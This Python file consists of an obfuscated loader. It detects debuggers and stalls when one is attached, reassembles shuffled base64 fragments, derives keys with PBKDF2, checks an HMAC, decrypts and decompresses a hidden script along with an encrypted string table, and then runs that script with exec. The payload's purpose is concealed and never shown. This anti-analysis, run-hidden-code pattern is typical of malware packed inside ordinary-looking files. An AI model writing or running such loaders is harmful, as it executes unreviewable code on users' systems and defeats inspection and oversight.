import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_0d96fa_0 = 'oHfQG54p1foQpUkvtdan'
_0d96fa_1 = 'fTLMqMZYe0MvJLPtvLVOEMTGAyd8w2yzZGEcXJ/4mnIFW/shjQMzJ4JKu5MOVO'
_0d96fa_2 = 'cDlWS6WwsqFNClWY3LZm/1aYUO9RvLnXKyTBujoN5u3AG5watQg'
_0d96fa_3 = 'l/9FNfOuieZFKDGck0Pho9Vh8'
_0d96fa_4 = '9PPxNbW7BTD6rDW/YlMTe/rd7xhJJajh'
_0d96fa_5 = 'mo0DBanhlw8Fdo1B6t/M2vNR8xcOmBD'
_0d96fa_6 = 'ecs28bWEw0DtMQyFNB3hN9BlCwxi'
_0d96fa_7 = 'V8GzHyIam0ui13EB/UkjpFSIHXWWRKB/dOp/4QmAEDmxUzAVnTDhO0GbvQb/ng'
_0d96fa_8 = 'DpyWiWc0sgZHGhDkZ6ldSKHwoo4CLdI9+Zr/FLdtmFHHDpwW9fY8dqXa'
_0d96fa_9 = 'nwetJNTadj/GLwuJuUzDULrPN6ojQrgXWxRPa9+Nuovog8sFWt'
_0d96fa_10 = 'cdjwqhCq/iM17kt2pQ6PErdbqoBXmTz80i'
_0d96fa_11 = 'tTYLgoodJvVGrumOMGIn/BqqzzNy9P218liFhYQB'
_0d96fa_12 = 'LMohGDrMQYa6WHKto5bvbQcsCW2GsMRp19HIeryh'
_0d96fa_13 = '/E+xorihUDOUG1qsZPoi07oSNDIihdBNcqPuYF6l/qBr+wnl3vzTibZoj'
_0d96fa_14 = '5snVVx194w1IlWz80yAPJnjMQaExXt7JWFVsx14UYnGrZQ4So'
_0d96fa_15 = 'WgVfuOCKS6oMa/9nG2bEZWlG+YotQloAX1o6pprhV'
_0d96fa_16 = 'UidTezjnIGAnKxnfEkCqqqKX9+WSYcjorISyIHGDJDx6tUxmL9iJ/abqZSYGm'
_0d96fa_17 = '4zFb5i2bZoTlhZhRes4MhDCEDgrwDEea3AOD'
_0d96fa_18 = 'yAIjmX8bbyUnk7WBJA2yRsCqhZZ'
_0d96fa_19 = 'sDyqizFLDxp6s21Pfbsfd7NXwZQk5LKdPR90d0mHAgh'
_0d96fa_20 = 'kwUQazRm38VscZ0QXGUxso85xuibdJKKqSu1B7zw67yooL'
_0d96fa_21 = 'auPWJe56IgQAtsqaoniPgAHY9d/9i'
_0d96fa_22 = 'dUkT8oS3l7M6cfsr0K/K/RLs2'
_0d96fa_23 = 'Fue5mhnRjA9DVnkyVKMeMDULQBnYVGakA0xWVV9dk+s0P5Y6Fvwu'
_0d96fa_24 = 'SKhvaTCpGvLmCKHjy5he6H+krrULo7UxzUdvr+yuatSwtLq4SffQvrtq0wLI02q6'
_0d96fa_25 = 'NFPq9+5Iit8VX+eMk5myEcNIYe1SArSNO147uqE30Im'
_0d96fa_26 = '6rKicfJ4ccFrxr6k6g1e4wjkiXe+G88a/r'
_0d96fa_27 = '9+nwn0xB6HsE795F75iDS1lYFAQhtlX'
_0d96fa_28 = '7/c1TE7C2qkHgVGqbd/z9AOgtrSQSVgJ/Yf2JE5jubIR2209FU3tNAlok5'
_0d96fa_29 = 'jX6B64nHkMnLvo+7OCzJUGtj6'
_0d96fa_30 = '1I9RLooM70MVCzEsoDCSpXlVsS9/OPTtXY8L1+oEDzycqkW'
_0d96fa_31 = 'ePDxmnyonA=='
_0d96fa_32 = 'COsqmgWuZimxiEqmRHsH8m6pxrA5WG'
_0d96fa_33 = 'DuSXhC9ED3SY6PAEQ2TqAjqMMnUpRH7/Sitk+kwW3xaj'
_0d96fa_34 = 'CCOixQKehEj/OqnwAjXSTxkUgUaBBWEcw/OuuCodNTB'
_0d96fa_35 = 'CoYF0lYpZ6JsJtLXtuuEqezr'
_pls = [_0d96fa_0, _0d96fa_1, _0d96fa_2, _0d96fa_3, _0d96fa_4, _0d96fa_5, _0d96fa_6, _0d96fa_7, _0d96fa_8, _0d96fa_9, _0d96fa_10, _0d96fa_11, _0d96fa_12, _0d96fa_13, _0d96fa_14, _0d96fa_15, _0d96fa_16, _0d96fa_17, _0d96fa_18, _0d96fa_19, _0d96fa_20, _0d96fa_21, _0d96fa_22, _0d96fa_23, _0d96fa_24, _0d96fa_25, _0d96fa_26, _0d96fa_27, _0d96fa_28, _0d96fa_29, _0d96fa_30, _0d96fa_31, _0d96fa_32, _0d96fa_33, _0d96fa_34, _0d96fa_35]
_33deed = [(4631,43939,2),(29680,62728,2),(36083,36503,2),(1275,3922,2),(61183,47322,2),(24534,5480,2),(63067,27435,2),(36319,8020,2),(15695,12561,2),(13283,19420,2),(12980,44179,2),(31470,41555,2),(31814,41239,2),(31832,6455,2),(11821,57899,2),(13693,5795,2),(0,0,0),(0,0,0)]
_85ea5f = 'ubSG+A=='
_ef5058 = '7yD2XvkFKZa+Y742'
_595a13 = 'G6ZkWV3Hx8w='
_4489bd = [33, 15, 0, 29, 24, 23, 17, 28, 12, 1, 16, 8, 7, 20, 21, 14, 25, 9, 27, 3, 4, 6, 10, 32, 13, 26, 2, 30, 5, 31, 22, 35, 11, 34, 19, 18]
_salt = base64.b64decode(_595a13)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _4489bd
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_4364f5 = base64.b64decode(_assembled)
_05b707 = 32
_1bb1e1 = _4364f5[:-_05b707]
_05b707 = _4364f5[-_05b707:]
_d785d1 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_33deed)
_hdr = base64.b64decode(_85ea5f)
_nonce = base64.b64decode(_ef5058)
_km_seed = hashlib.sha256(_d785d1 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _1bb1e1, hashlib.sha256).digest()
if _calc_tag != _05b707:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_1bb1e1)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_1bb1e1, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_94a1ba'] = mmap
globals()['_b73fdc'] = lambda i: globals()['_94a1ba'][str(i)]
_x = globals()['_b73fdc']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
